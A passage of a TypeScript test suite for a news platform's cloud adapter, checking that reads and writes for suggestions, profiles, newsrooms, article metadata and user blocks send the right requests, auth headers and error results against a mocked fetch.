      '/rest/v1/nw_suggestion_events': [
        {
          id: 'e1',
          suggestion_id: 's1',
          actor_id: 'p1',
          action: 'comment',
          payload: { body: 'Nice catch.' },
          created_at: '2026-07-01T01:00:00Z',
        },
      ],
      '/rest/v1/nw_public_profiles': [publicProfileRow],
    });
    const port = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: impl });
    expect(await port.getSuggestionEvents('s1')).toEqual([
      expect.objectContaining({ id: 'e1', actorHandle: 'rosamarin' }),
    ]);
    expect(decodeURIComponent(calls[0]?.url ?? '')).toContain('suggestion_id=eq.s1');
    expect(headersOf(calls[0]).Authorization).toBe('Bearer anon-1');
    expect(calls).toHaveLength(2);
  });

  it('suggestion and event reads carry the session bearer when a token is available', async () => {
    const { impl, calls } = recordedFetch({
      '/rest/v1/nw_edit_suggestions': [suggestionApiRow],
      '/rest/v1/nw_suggestion_events': [],
      '/rest/v1/nw_public_profiles': [editorProfileRow],
    });
    const port = createMyNewsCloudAdapter({
      baseUrl: BASE,
      anonKey: 'anon-1',
      fetchImpl: impl,
      getAccessToken: async () => 'session-token',
    });
    await port.getSuggestionsForArticle('a1');
    await port.getSuggestion('s1');
    await port.getMySuggestions('ed1');
    await port.getReviewQueue('p1');
    await port.getSuggestionEvents('s1');
    expect(calls).toHaveLength(9);
    expect(calls.every((c) => headersOf(c).Authorization === 'Bearer session-token')).toBe(true);
    expect(calls.every((c) => headersOf(c).apikey === 'anon-1')).toBe(true);
  });

  it('getMyProfile returns null without a token and never fires a request', async () => {
    const { impl, calls } = recordedFetch({});
    const port = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: impl });
    expect(await port.getMyProfile()).toBeNull();
    const nullToken = createMyNewsCloudAdapter({
      baseUrl: BASE,
      anonKey: 'anon-1',
      fetchImpl: impl,
      getAccessToken: async () => null,
    });
    expect(await nullToken.getMyProfile()).toBeNull();
    expect(calls).toHaveLength(0);
  });

  it('getMyProfile queries by the JWT sub with the session bearer', async () => {
    const token = fakeJwt('u1');
    const { impl, calls } = recordedFetch({
      '/rest/v1/nw_profiles': [
        {
          id: 'p1',
          user_id: 'u1',
          handle: 'rosamarin',
          display_name: 'Rosa Marín',
          pubkey_ed25519: 'pub-rosa',
          kind: 'reader',
        },
      ],
    });
    const port = createMyNewsCloudAdapter({
      baseUrl: BASE,
      anonKey: 'anon-1',
      fetchImpl: impl,
      getAccessToken: async () => token,
    });
    const profile = await port.getMyProfile();
    expect(profile?.handle).toBe('rosamarin');
    expect(decodeURIComponent(calls[0]?.url ?? '')).toContain('user_id=eq.u1');
    expect(headersOf(calls[0]).apikey).toBe('anon-1');
    expect(headersOf(calls[0]).Authorization).toBe(`Bearer ${token}`);
  });

  it('getDraftArticle requires the session bearer and skips the status filter', async () => {
    const { impl, calls } = recordedFetch({
      '/rest/v1/nw_articles': [draftApiRow],
      '/rest/v1/nw_public_profiles': [publicProfileRow],
      '/rest/v1/nw_public_journalists': [publicJournalistRow],
    });
    const signedOut = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: impl });
    expect(await signedOut.getDraftArticle('a9')).toBeNull();
    expect(calls).toHaveLength(0);

    const port = createMyNewsCloudAdapter({
      baseUrl: BASE,
      anonKey: 'anon-1',
      fetchImpl: impl,
      getAccessToken: async () => 'session-token',
    });
    const view = await port.getDraftArticle('a9');
    expect(view).toMatchObject({ slug: 'draft-piece', status: 'draft', publishedAt: '' });
    expect(headersOf(calls[0]).Authorization).toBe('Bearer session-token');
    expect(decodeURIComponent(calls[0]?.url ?? '')).not.toContain('status=');
    expect(calls).toHaveLength(3);
  });

  it('getEditorProfile joins profile, ledger, and stats into aggregates', async () => {
    const { impl, calls } = recordedFetch({
      '/rest/v1/nw_public_profiles': [{ id: 'ed1', handle: 'sam', display_name: 'Sam Lee', kind: 'editor' }],
      '/rest/v1/nw_credibility_ledger': [
        {
          id: 'l1',
          editor_id: 'ed1',
          suggestion_id: 's1',
          base_points: 10,
          diversity_mult: 0.42,
          standing_mult: 0.85,
          awarded_at: '2026-07-02T00:00:00Z',
          suggestion: { type: 'correction', article: { author_id: 'p1' } },
        },
      ],
      '/rest/v1/nw_edit_suggestions': [
        { status: 'accepted', article: { author_id: 'p1' } },
        { status: 'open', article: { author_id: 'p2' } },
      ],
    });
    const port = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: impl });
    const view = await port.getEditorProfile('sam');
    expect(view?.profile).toEqual({ id: 'ed1', handle: 'sam', displayName: 'Sam Lee', kind: 'editor' });
    expect(view?.ledger.map((l) => l.id)).toEqual(['l1']);
    expect(view?.aggregates).toEqual({
      openCount: 1,
      decidedSampleSize: 1,
      acceptanceRate: 1,
      distinctAuthors: 1,
    });
    expect(calls).toHaveLength(3);
    expect(calls.every((c) => headersOf(c).Authorization === 'Bearer anon-1')).toBe(true);

    const empty = createMyNewsCloudAdapter({
      baseUrl: BASE,
      anonKey: 'anon-1',
      fetchImpl: recordedFetch({}).impl,
    });
    expect(await empty.getEditorProfile('ghost')).toBeNull();
  });

  it('newsroom reads return empty without a token and use the session bearer with one', async () => {
    const { impl, calls } = recordedFetch({
      '/rest/v1/nw_newsroom_members': [
        { newsroom: { id: 'n1', owner_id: 'p1', name: 'Valley Desk', created_at: '2026-07-01T00:00:00Z' } },
      ],
    });
    const signedOut = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: impl });
    expect(await signedOut.listMyNewsrooms('p1')).toEqual([]);
    expect(await signedOut.getNewsroom('n1')).toBeNull();
    expect(calls).toHaveLength(0);

    const port = createMyNewsCloudAdapter({
      baseUrl: BASE,
      anonKey: 'anon-1',
      fetchImpl: impl,
      getAccessToken: async () => 'session-token',
    });
    const rooms = await port.listMyNewsrooms('p1');
    expect(rooms).toEqual([{ id: 'n1', ownerId: 'p1', name: 'Valley Desk', createdAt: '2026-07-01T00:00:00Z' }]);
    expect(headersOf(calls[0]).Authorization).toBe('Bearer session-token');
  });

  it('getNewsroom assembles members and drafts with one deduplicated profile read', async () => {
    const { impl, calls } = recordedFetch({
      '/rest/v1/nw_newsrooms': [
        { id: 'n1', owner_id: 'p1', name: 'Valley Desk', created_at: '2026-07-01T00:00:00Z' },
      ],
      '/rest/v1/nw_newsroom_members': [
        { newsroom_id: 'n1', profile_id: 'p1', role: 'owner' },
      ],
      '/rest/v1/nw_articles': [
        {
          id: 'a9',
          author_id: 'p1',
          slug: 'draft-piece',
          current_rev: 1,
          nw_article_revisions: [{ rev: 1, headline: 'Draft piece', created_at: '2026-07-02T00:00:00Z' }],
          nw_article_meta: null,
        },
      ],
      '/rest/v1/nw_public_profiles': [publicProfileRow],
    });
    const port = createMyNewsCloudAdapter({
      baseUrl: BASE,
      anonKey: 'anon-1',
      fetchImpl: impl,
      getAccessToken: async () => 'session-token',
    });
    const view = await port.getNewsroom('n1');
    expect(view?.newsroom.name).toBe('Valley Desk');
    expect(view?.members[0]?.handle).toBe('rosamarin');
    expect(view?.drafts[0]).toEqual({
      articleId: 'a9',
      slug: 'draft-piece',
      headline: 'Draft piece',
      rev: 1,
      updatedAt: '2026-07-02T00:00:00Z',
      embargoUntil: null,
      authorHandle: 'rosamarin',
    });
    expect(calls).toHaveLength(4);
    expect(calls.every((c) => headersOf(c).Authorization === 'Bearer session-token')).toBe(true);
    const profileCall = calls.find((call) => call.url.includes('/rest/v1/nw_public_profiles'));
    expect(decodeURIComponent(profileCall?.url ?? '')).toContain('id=in.("p1")');
  });
});

describe('editing-desk adapter writes', () => {
  const sessionCfg = (impl: typeof fetch) => ({
    baseUrl: BASE,
    anonKey: 'anon-1',
    fetchImpl: impl,
    getAccessToken: async () => 'session-token',
  });

  it('registerProfile requires a session locally with no network call', async () => {
    const { impl, calls } = recordedFetch({});
    const port = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: impl });
    const res = await port.registerProfile({
      userId: 'u1',
      handle: 'rosamarin',
      displayName: 'Rosa Marín',
    });
    expect(res).toEqual({ ok: false, error: 'not-signed-in' });
    expect(calls).toHaveLength(0);
  });

  it('registerProfile posts the snake_case row and maps the representation', async () => {
    const { impl, calls } = recordedFetch({
      '/rest/v1/nw_profiles': {
        status: 201,
        body: [
          {
            id: 'p1',
            user_id: 'u1',
            handle: 'rosamarin',
            display_name: 'Rosa Marín',
            pubkey_ed25519: 'pub-rosa',
            kind: 'reader',
          },
        ],
      },
    });
    const port = createMyNewsCloudAdapter(sessionCfg(impl));
    const res = await port.registerProfile({
      userId: 'u1',
      handle: 'rosamarin',
      displayName: 'Rosa Marín',
    });
    expect(res.ok).toBe(true);
    if (res.ok) expect(res.profile.id).toBe('p1');
    expect(calls[0]?.init?.method).toBe('POST');
    expect(headersOf(calls[0]).Prefer).toBe('return=representation');
    expect(headersOf(calls[0]).apikey).toBe('anon-1');
    expect(headersOf(calls[0]).Authorization).toBe('Bearer session-token');
    // The key is NOT set at insert time; it defaults to '' and is bound later
    // through registerKey (proof-of-possession).
    expect(bodyOf(calls[0])).toEqual({
      user_id: 'u1',
      handle: 'rosamarin',
      display_name: 'Rosa Marín',
      pubkey_ed25519: '',
    });
  });

  it('registerKey posts to the mynews-register-key function and maps ok', async () => {
    const { impl, calls } = recordedFetch({
      '/functions/v1/mynews-register-key': { status: 200, body: { ok: true, data: { pubkey: 'pub-rosa' } } },
    });
    const port = createMyNewsCloudAdapter(sessionCfg(impl));
    const res = await port.registerKey({
      userId: 'u1',
      pubkeyHex: 'pub-rosa',
      signatureHex: 'sig-1',
    });
    expect(res).toEqual({ ok: true });
    expect(calls[0]?.url).toContain('/functions/v1/mynews-register-key');
    expect(calls[0]?.init?.method).toBe('POST');
    expect(bodyOf(calls[0])).toEqual({ pubkey: 'pub-rosa', signatureHex: 'sig-1' });
  });

  it('registerKey surfaces a typed server error', async () => {
    const { impl } = recordedFetch({
      '/functions/v1/mynews-register-key': { status: 409, body: { ok: false, error: 'pubkey-conflict' } },
    });
    const port = createMyNewsCloudAdapter(sessionCfg(impl));
    const res = await port.registerKey({ userId: 'u1', pubkeyHex: 'pub-rosa', signatureHex: 'sig-1' });
    expect(res).toEqual({ ok: false, error: 'pubkey-conflict' });
  });

  it('registerProfile maps a 409 on the handle constraint to handle-taken', async () => {
    const { impl } = recordedFetch({
      '/rest/v1/nw_profiles': {
        status: 409,
        body: {
          message: 'duplicate key value violates unique constraint "nw_profiles_handle_key"',
        },
      },
    });
    const port = createMyNewsCloudAdapter(sessionCfg(impl));
    const res = await port.registerProfile({
      userId: 'u1',
      handle: 'rosamarin',
      displayName: 'Rosa Marín',
    });
    expect(res).toEqual({ ok: false, error: 'handle-taken' });
  });

  it('registerProfile maps a 409 on the user_id constraint to already-registered', async () => {
    const { impl } = recordedFetch({
      '/rest/v1/nw_profiles': {
        status: 409,
        body: {
          message: 'duplicate key value violates unique constraint "nw_profiles_user_id_key"',
        },
      },
    });
    const port = createMyNewsCloudAdapter(sessionCfg(impl));
    const res = await port.registerProfile({
      userId: 'u1',
      handle: 'freshhandle',
      displayName: 'Rosa Marín',
    });
    expect(res).toEqual({ ok: false, error: 'already-registered' });
  });

  it('becomeJournalist posts without a tier field and needs a session', async () => {
    const { impl: bare, calls: bareCalls } = recordedFetch({});
    const signedOut = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: bare });
    expect(
      await signedOut.becomeJournalist({ profileId: 'p1', bio: '', beats: [], region: '' }),
    ).toEqual({ ok: false, error: 'not-signed-in' });
    expect(bareCalls).toHaveLength(0);

    const { impl, calls } = recordedFetch({ '/rest/v1/nw_journalists': { status: 201, body: null } });
    const port = createMyNewsCloudAdapter(sessionCfg(impl));
    const res = await port.becomeJournalist({
      profileId: 'p1',
      bio: 'Water and land.',
      beats: ['water'],
      region: 'CA',
    });
    expect(res).toEqual({ ok: true });
    expect(bodyOf(calls[0])).toEqual({
      profile_id: 'p1',
      bio: 'Water and land.',
      beats: ['water'],
      region: 'CA',
    });
    expect(bodyOf(calls[0])).not.toHaveProperty('tier');
  });

  it('postSuggestionComment calls the mynews-comment function and needs a session', async () => {
    const { impl: bare, calls: bareCalls } = recordedFetch({});
    const signedOut = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: bare });
    expect(
      await signedOut.postSuggestionComment({ suggestionId: 's1', actorProfileId: 'p1', body: 'Hi' }),
    ).toEqual({ ok: false, error: 'not-signed-in' });
    expect(bareCalls).toHaveLength(0);

    const { impl, calls } = recordedFetch({
      '/functions/v1/mynews-comment': { ok: true, data: { suggestionId: 's1' } },
    });
    const port = createMyNewsCloudAdapter(sessionCfg(impl));
    expect(
      await port.postSuggestionComment({ suggestionId: 's1', actorProfileId: 'p1', body: 'Nice catch.' }),
    ).toEqual({ ok: true });
    // The raw nw_suggestion_events insert is gone: migration 20260730000003
    // blocks it, and the actor id is never sent (the server uses the JWT sub).
    expect(calls[0]?.url).toContain('/functions/v1/mynews-comment');
    expect(calls.some((call) => call.url.includes('/rest/v1/nw_suggestion_events'))).toBe(false);
    expect(bodyOf(calls[0])).toEqual({ suggestionId: 's1', body: 'Nice catch.' });
    expect(headersOf(calls[0]).Authorization).toBe('Bearer session-token');
  });

  it('postSuggestionComment maps the typed server gates (WP4)', async () => {
    for (const [error, status] of [
      ['suspended', 403],
      ['terms-not-accepted', 403],
      ['rate-limited', 429],
      ['draft-access', 403],
      ['unknown-suggestion', 404],
      ['comment-unavailable', 503],
    ] as const) {
      const { impl } = recordedFetch({
        '/functions/v1/mynews-comment': { status, body: { ok: false, error } },
      });
      const port = createMyNewsCloudAdapter(sessionCfg(impl));
      expect(
        await port.postSuggestionComment({ suggestionId: 's1', actorProfileId: 'p1', body: 'Hi' }),
      ).toEqual({ ok: false, error });
    }
  });

  it('postSuggestionComment rejects an out-of-bounds body before any request', async () => {
    const { impl, calls } = recordedFetch({});
    const port = createMyNewsCloudAdapter(sessionCfg(impl));
    expect(
      await port.postSuggestionComment({ suggestionId: 's1', actorProfileId: 'p1', body: '  ' }),
    ).toEqual({ ok: false, error: 'bounds' });
    expect(
      await port.postSuggestionComment({
        suggestionId: 's1',
        actorProfileId: 'p1',
        body: 'x'.repeat(MYNEWS_BOUNDS.COMMENT_MAX_CHARS + 1),
      }),
    ).toEqual({ ok: false, error: 'bounds' });
    expect(calls).toHaveLength(0);
  });

  it('postSuggestionComment reports a transport failure honestly', async () => {
    const failing = (async () => {
      throw new Error('offline');
    }) as unknown as typeof fetch;
    const port = createMyNewsCloudAdapter(sessionCfg(failing));
    expect(
      await port.postSuggestionComment({ suggestionId: 's1', actorProfileId: 'p1', body: 'Hi' }),
    ).toEqual({ ok: false, error: 'comment-network' });
  });

  it('createNewsroom inserts the room then the owner membership', async () => {
    const { impl, calls } = recordedFetch({
      '/rest/v1/nw_newsrooms': {
        status: 201,
        body: [{ id: 'n1', owner_id: 'p1', name: 'Valley Desk', created_at: '2026-07-01T00:00:00Z' }],
      },
      '/rest/v1/nw_newsroom_members': { status: 201, body: null },
    });
    const port = createMyNewsCloudAdapter(sessionCfg(impl));
    const res = await port.createNewsroom({ ownerId: 'p1', name: 'Valley Desk' });
    expect(res).toEqual({
      ok: true,
      newsroom: { id: 'n1', ownerId: 'p1', name: 'Valley Desk', createdAt: '2026-07-01T00:00:00Z' },
    });
    expect(calls).toHaveLength(2);
    expect(bodyOf(calls[0])).toEqual({ owner_id: 'p1', name: 'Valley Desk' });
    expect(bodyOf(calls[1])).toEqual({
      newsroom_id: 'n1',
      profile_id: 'p1',
      role: 'owner',
      invited_by: 'p1',
    });
  });

  it('createNewsroom rolls back the room when the membership insert fails', async () => {
    const { impl, calls } = recordedFetch({
      '/rest/v1/nw_newsrooms?id=': { status: 204, body: null },
      '/rest/v1/nw_newsrooms': {
        status: 201,
        body: [{ id: 'n1', owner_id: 'p1', name: 'Valley Desk', created_at: '2026-07-01T00:00:00Z' }],
      },
      '/rest/v1/nw_newsroom_members': { status: 403, body: null },
    });
    const port = createMyNewsCloudAdapter(sessionCfg(impl));
    const res = await port.createNewsroom({ ownerId: 'p1', name: 'Valley Desk' });
    expect(res).toEqual({ ok: false, error: 'membership-failed' });
    expect(calls).toHaveLength(3);
    expect(calls[2]?.init?.method).toBe('DELETE');
    expect(decodeURIComponent(calls[2]?.url ?? '')).toContain('nw_newsrooms?id=eq.n1');
  });

  it('addNewsroomMember maps unknown handles locally after the resolve read', async () => {
    const { impl, calls } = recordedFetch({ '/rest/v1/nw_public_profiles': [] });
    const port = createMyNewsCloudAdapter(sessionCfg(impl));
    const res = await port.addNewsroomMember({
      newsroomId: 'n1',
      handle: 'ghost',
      role: 'reviewer',
      invitedBy: 'p1',
    });
    expect(res).toEqual({ ok: false, error: 'unknown-handle' });
    expect(calls).toHaveLength(1);
  });

  it('addNewsroomMember resolves the handle then posts the member row', async () => {
    const { impl, calls } = recordedFetch({
      '/rest/v1/nw_public_profiles': [{ id: 'p2' }],
      '/rest/v1/nw_newsroom_members': { status: 201, body: null },
    });
    const port = createMyNewsCloudAdapter(sessionCfg(impl));
    const res = await port.addNewsroomMember({
      newsroomId: 'n1',
      handle: 'sam',
      role: 'coauthor',
      invitedBy: 'p1',
    });
    expect(res).toEqual({ ok: true });
    expect(decodeURIComponent(calls[0]?.url ?? '')).toContain('handle=eq.sam');
    expect(bodyOf(calls[1])).toEqual({
      newsroom_id: 'n1',
      profile_id: 'p2',
      role: 'coauthor',
      invited_by: 'p1',
    });
  });

  it('removeNewsroomMember deletes by newsroom and profile', async () => {
    const { impl, calls } = recordedFetch({
      '/rest/v1/nw_newsroom_members': { status: 204, body: null },
    });
    const port = createMyNewsCloudAdapter(sessionCfg(impl));
    expect(await port.removeNewsroomMember({ newsroomId: 'n1', profileId: 'p2' })).toEqual({ ok: true });
    expect(calls[0]?.init?.method).toBe('DELETE');
    const decoded = decodeURIComponent(calls[0]?.url ?? '');
    expect(decoded).toContain('newsroom_id=eq.n1');
    expect(decoded).toContain('profile_id=eq.p2');
  });

  it('newsroom writes require a session locally', async () => {
    const { impl, calls } = recordedFetch({});
    const port = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: impl });
    expect(await port.createNewsroom({ ownerId: 'p1', name: 'X' })).toEqual({
      ok: false,
      error: 'not-signed-in',
    });
    expect(
      await port.addNewsroomMember({ newsroomId: 'n1', handle: 'sam', role: 'reviewer', invitedBy: 'p1' }),
    ).toEqual({ ok: false, error: 'not-signed-in' });
    expect(await port.removeNewsroomMember({ newsroomId: 'n1', profileId: 'p2' })).toEqual({
      ok: false,
      error: 'not-signed-in',
    });
    expect(calls).toHaveLength(0);
  });

  it('getArticleMeta reads nw_article_meta and maps the row to the view', async () => {
    const { impl, calls } = recordedFetch({
      '/rest/v1/nw_article_meta': {
        status: 200,
        body: [
          {
            article_id: 'a1',
            doi: '10.1234/x',
            orcid_authors: ['0000-0002-1825-0097'],
            license: 'CC-BY-4.0',
            rights_route: 'cc_by',
            embargo_until: '2026-08-01T00:00:00.000Z',
            dataset_hashes: ['sha256:abc'],
            canonical_url: 'https://example.org/a1',
            signature: 'sig-1',
            signer_pubkey: 'pub-rosa',
          },
        ],
      },
    });
    const port = createMyNewsCloudAdapter(sessionCfg(impl));
    const meta = await port.getArticleMeta('a1');
    expect(meta).toEqual({
      articleId: 'a1',
      doi: '10.1234/x',
      orcidAuthors: ['0000-0002-1825-0097'],
      license: 'CC-BY-4.0',
      rightsRoute: 'cc_by',
      embargoUntil: '2026-08-01T00:00:00.000Z',
      datasetHashes: ['sha256:abc'],
      canonicalUrl: 'https://example.org/a1',
      signature: 'sig-1',
      signerPubkey: 'pub-rosa',
    });
    expect(decodeURIComponent(calls[0]?.url ?? '')).toContain('/rest/v1/nw_article_meta');
    expect(decodeURIComponent(calls[0]?.url ?? '')).toContain('article_id=eq.a1');
  });

  it('getArticleMeta returns null when no meta row exists', async () => {
    const { impl } = recordedFetch({ '/rest/v1/nw_article_meta': { status: 200, body: [] } });
    const port = createMyNewsCloudAdapter(sessionCfg(impl));
    expect(await port.getArticleMeta('a1')).toBeNull();
  });

  it('setArticleMeta posts the signed payload to the mynews-set-meta function', async () => {
    const { impl, calls } = recordedFetch({
      '/functions/v1/mynews-set-meta': { status: 200, body: { ok: true, data: { articleId: 'a1' } } },
    });
    const port = createMyNewsCloudAdapter(sessionCfg(impl));
    const meta = {
      articleId: 'a1',
      doi: '10.1234/x',
      orcidAuthors: ['0000-0002-1825-0097'],
      license: 'CC-BY-4.0',
      rightsRoute: 'cc_by',
      embargoUntil: '2026-08-01T00:00:00.000Z',
      datasetHashes: ['sha256:abc'],
      canonicalUrl: 'https://example.org/a1',
      signerPubkey: 'pub-rosa',
    };
    expect(await port.setArticleMeta({ meta, signatureHex: 'sig-1' })).toEqual({ ok: true });
    expect(calls[0]?.url).toContain('/functions/v1/mynews-set-meta');
    expect(calls[0]?.init?.method).toBe('POST');
    expect(bodyOf(calls[0])).toEqual({ meta, signatureHex: 'sig-1' });
  });

  it('setArticleMeta surfaces a typed server error', async () => {
    const { impl } = recordedFetch({
      '/functions/v1/mynews-set-meta': { status: 403, body: { ok: false, error: 'not-author' } },
    });
    const port = createMyNewsCloudAdapter(sessionCfg(impl));
    const meta = {
      articleId: 'a1',
      doi: null,
      orcidAuthors: [],
      license: '',
      rightsRoute: '',
      embargoUntil: null,
      datasetHashes: [],
      canonicalUrl: null,
      signerPubkey: 'pub-rosa',
    };
    expect(await port.setArticleMeta({ meta, signatureHex: 'sig-1' })).toEqual({
      ok: false,
      error: 'not-author',
    });
  });
});

describe('block URL builders + row mapping', () => {
  it('buildMyBlocksUrl selects blocker rows without a public-view embed', () => {
    const url = buildMyBlocksUrl(BASE);
    const decoded = decodeURIComponent(url);
    expect(url).toContain('/rest/v1/nw_blocks?');
    expect(url).toContain('blocked_profile_id');
    expect(decoded).not.toContain('nw_public_profiles');
    expect(url).toContain('order=created_at.desc');
  });

  it('buildRemoveBlockUrl targets the blocked author (RLS scopes to the caller)', () => {
    expect(buildRemoveBlockUrl(BASE, 'p-troll')).toContain('blocked_profile_id=eq.p-troll');
  });

  it('mapBlockRow reads the embed and drops unknown modes', () => {
    expect(
      mapBlockRow({
        id: 'b1',
        blocked_profile_id: 'p-troll',
        mode: 'block',
        created_at: '2026-07-05T00:00:00Z',
        blocked: {
          id: 'p-troll',
          handle: 'troll',
          display_name: 'Troll',
          pubkey_ed25519: 'pub-troll',
        },
      }),
    ).toEqual({
      id: 'b1',
      blockedProfileId: 'p-troll',
      blockedPubkey: 'pub-troll',
      blockedHandle: 'troll',
      blockedDisplayName: 'Troll',
      mode: 'block',
      createdAt: '2026-07-05T00:00:00Z',
    });
    expect(
      mapBlockRow({ id: 'b2', blocked_profile_id: 'p', mode: 'nope', created_at: '', blocked: null }),
    ).toBeNull();
  });
});

describe('block adapter reads + writes', () => {
  it('listBlocks returns nothing signed out and maps rows with a session', async () => {
    const { impl, calls } = recordedFetch({
      '/rest/v1/nw_blocks': [
        {
          id: 'b1',
          blocked_profile_id: 'p-troll',
          mode: 'mute',
          created_at: '2026-07-05T00:00:00Z',
        },
      ],
      '/rest/v1/nw_public_profiles': [
        {
          id: 'p-troll',
          handle: 'troll',
          display_name: 'Troll',
          pubkey_ed25519: 'pub-troll',
        },
      ],
    });
    const signedOut = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: impl });
    expect(await signedOut.listBlocks()).toEqual([]);
    expect(calls).toHaveLength(0);

    const port = createMyNewsCloudAdapter({
      baseUrl: BASE,
      anonKey: 'anon-1',
      fetchImpl: impl,
      getAccessToken: async () => fakeJwt('u-me'),
    });
    const list = await port.listBlocks();
    expect(list[0]).toMatchObject({ blockedProfileId: 'p-troll', blockedPubkey: 'pub-troll', mode: 'mute' });
    expect(headersOf(calls[0]).Authorization).toContain('Bearer ');
    expect(calls).toHaveLength(2);
  });

  it('setBlock resolves the caller profile, then upserts the block row', async () => {
    const { impl, calls } = recordedFetch({
      '/rest/v1/nw_profiles': [{ id: 'p-me' }],
      '/rest/v1/nw_blocks': { status: 201, body: [] },
    });
    const port = createMyNewsCloudAdapter({
      baseUrl: BASE,
      anonKey: 'anon-1',
      fetchImpl: impl,
      getAccessToken: async () => fakeJwt('u-me'),
    });
    expect(await port.setBlock('p-troll', 'block')).toEqual({ ok: true });
    const postCall = calls.find((c) => c.url.includes('/rest/v1/nw_blocks'));
    expect(bodyOf(postCall)).toEqual({
      blocker_id: 'p-me',
      blocked_profile_id: 'p-troll',
      mode: 'block',
    });
    expect(headersOf(postCall).Prefer).toContain('merge-duplicates');
  });

  it('setBlock refuses signed out, missing profile, and blocking yourself', async () => {
    const signedOut = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: recordedFetch({}).impl });
    expect(await signedOut.setBlock('p-troll', 'block')).toEqual({ ok: false, error: 'not-signed-in' });

    const noProfile = createMyNewsCloudAdapter({
      baseUrl: BASE,
      anonKey: 'anon-1',
      fetchImpl: recordedFetch({ '/rest/v1/nw_profiles': [] }).impl,
      getAccessToken: async () => fakeJwt('u-me'),
    });
    expect(await noProfile.setBlock('p-troll', 'block')).toEqual({ ok: false, error: 'no-profile' });

    const self = createMyNewsCloudAdapter({
      baseUrl: BASE,
      anonKey: 'anon-1',
      fetchImpl: recordedFetch({ '/rest/v1/nw_profiles': [{ id: 'p-me' }] }).impl,
      getAccessToken: async () => fakeJwt('u-me'),
    });
    expect(await self.setBlock('p-me', 'block')).toEqual({ ok: false, error: 'cannot-block-self' });
  });

  it('removeBlock DELETEs the row and reports failure honestly', async () => {
    const { impl, calls } = recordedFetch({ '/rest/v1/nw_blocks': { status: 204, body: null } });
    const port = createMyNewsCloudAdapter({
      baseUrl: BASE,
      anonKey: 'anon-1',
      fetchImpl: impl,
      getAccessToken: async () => fakeJwt('u-me'),
    });
    expect(await port.removeBlock('p-troll')).toEqual({ ok: true });
    const del = calls.find((c) => c.url.includes('/rest/v1/nw_blocks'));
    expect(del?.init?.method).toBe('DELETE');
    expect(del?.url).toContain('blocked_profile_id=eq.p-troll');

    const signedOut = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: recordedFetch({}).impl });
    expect(await signedOut.removeBlock('p-troll')).toEqual({ ok: false, error: 'not-signed-in' });
  });
});
